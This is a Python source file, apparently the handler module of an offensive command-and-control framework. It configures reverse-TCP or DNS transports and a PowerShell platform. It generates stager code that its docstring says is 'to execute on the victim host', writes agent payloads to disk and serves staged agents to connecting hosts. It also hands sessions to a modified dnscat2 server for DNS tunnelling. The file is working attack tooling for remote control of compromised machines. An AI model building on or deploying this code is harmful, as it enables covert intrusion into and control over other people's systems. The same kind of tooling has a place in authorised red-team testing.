#!/usr/bin/python3
import os

from syhelpers.files import sanatizefilename
from .transport.dns import TransportDns
from .transport.reversetcp import TransportReverseTcp
from .message.message import Message
from syplatform.powershell.powershell import PlatformPowershell
from syhelpers.log import *
from syhelpers.modulebase import ModuleBase

DEBUG_MODULE = "Handler"


class Handler(ModuleBase):
    """ Base handler for all interactions with agents """

    # noinspection PyMissingConstructor
    def __init__(self):
        """
        Initialize base handler
        """

        self.options = {
            'TRANSPORT': {
                'Description'   :   'Communication way between agent and handler',
                'Required'      :   True,
                'Value'         :   "REVERSETCP",
                'Options'       :   ("REVERSETCP", "DNS")
            },
            'CHANNELENCRYPTION' : {
                'Description'   :   'Encryption Protocol in the transport',
                'Required'      :   True,
                'Value'         :   "TLS",
                'Options'       :   ("NONE", "TLS")
            },
            'PLATFORM' : {
                'Description'   :   'Platform of agent code',
                'Required'      :   True,
                'Value'         :   "POWERSHELL",
                'Options'       :   ("POWERSHELL",)
            }
        }
        self.transport = TransportReverseTcp(self)
        #TODO: CHANNELENCRYPTION?
        self.platform = PlatformPowershell(self)
    
    def setoption(self, name, value):
        """
        set an option for the handler or any of transport and platform modules currently selected
        It tries all of these modules in that order and uses the first success.
        """
        
        if ModuleBase.setoption(self, name, value):
            #print_debug(DEBUG_MODULE, "set {} = {}".format(name, value))
            if str(name).upper() == "TRANSPORT":
                if str(value).upper() == "REVERSETCP":
                    print_debug(DEBUG_MODULE, "changing TRANSPORT to REVERSETCP")
                    self.transport = TransportReverseTcp(self)
                elif str(value).upper() == "DNS":
                    print_debug(DEBUG_MODULE, "changing TRANSPORT to DNS")
                    self.transport = TransportDns(self)
            if str(name).upper() == "PLATFORM":
                if str(value).upper() == "POWERSHELL":
                    print_debug(DEBUG_MODULE, "changing PLATFORM to POWERSHELL")
                    self.platform = PlatformPowershell(self)
            return True
        elif self.transport and self.transport.setoption(name, value):
            return True
        elif self.platform and self.platform.setoption(name, value):
            return True
        else:
            print_error(str(name.upper())+" not recognized as an option")
            return False

    def validate_options(self):
        """
        validate the options for the handler, the selected transport and platform modules
        The validation succeeds only if all of these modules can be validated.
        """

        return ModuleBase.validate_options(self) and self.transport.validate_options() and \
            self.platform.validate_options()

    def generatestager(self):
        """
        generate and print a stager for the current platform / transport
        This method can be used to show a short line to execute on the victim host.
        """

        if not self.validate_options():
            return
        
        stager = self.platform.getstager()
        if stager:
            print_message("Use the following stager code:")
            print_text(stager)
        else:
            print_error("Failed to generate stager code")

    def generateagent(self, filename, staged=False):
        """
        generates the agent code and writes it to the file
        :param filename: name of the file to write to
        :param staged: generate the staged form? this one is usually encoded and signed, so you may just want to
            go with the default of False
        :return: None
        """

        if not self.validate_options():
            return

        agent = self.platform.getagent(staged=staged)
        if agent:
            file = open(filename, 'wb')
            if file:
                file.write(agent)
                file.close()
                print_message("Wrote agent code to file {}".format(filename))
            else:
                print_error("Could not open file {} for writing".format(filename))
        else:
            print_error("Failed to generate agent code")

    def run(self):
        """
        Run the listener and handle any communication with agents
        If staged, the initial connection will be upgraded to a full agent using 
        plattform / transport modules.
        """

        exiting = False

        if not self.validate_options():
            return

        try:
            self.transport.open(staged=self.platform.isstaged())

            # if staging is active, provide stager when first conntact
            if self.platform.isstaged():
                agent = self.platform.getagent()
                print_message("Sending staged agent ({} bytes)...".format(len(agent)))
                self.transport.send(agent)
                self.transport.upgradefromstager()
                print_message("Staging done")

            # special case handling for our hacked DNSCAT2WRAPPER
            if self.platform.options['AGENTTYPE']['Value'] != "DNSCAT2" and \
                            self.platform.options['AGENTTYPE']['Value'] != "DNSCAT2DOWNLOADER":

                # if channel encryption, now is the time!
                if self.options['CHANNELENCRYPTION']['Value'] == "TLS":
                    self.transport.upgradetotls()

                message0 = Message()
                message0.create(0x01, b'Test0')
                self.transport.sendmessage(message0)

                message1 = self.transport.receivemessage()

                message2 = Message()
                message2.create(0x01, b'TestBack')
                self.transport.sendmessage(message1)

        except KeyboardInterrupt:
            print_error("User interrupt, exiting...")
            exiting = True

        finally:
            self.transport.close()

        # special case handling for our hacked DNSCAT2WRAPPER
        if (self.platform.options['AGENTTYPE']['Value'] == "DNSCAT2" or
                    self.platform.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER") and not exiting:
            print_message("Starting dnscat2 to handle the real connection")
            zone = self.transport.options['ZONE']['Value'].rstrip(".")
            secret = self.platform.fingerprint
            print_debug(DEBUG_MODULE, "zone = {}, secret = {}".format(zone, secret))

            ruby = "/usr/bin/ruby"
            scriptpath = sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2/server/dnscat2.rb")
            os.execv(ruby, [ruby, scriptpath, "--no-cache", "--secret", secret, zone])
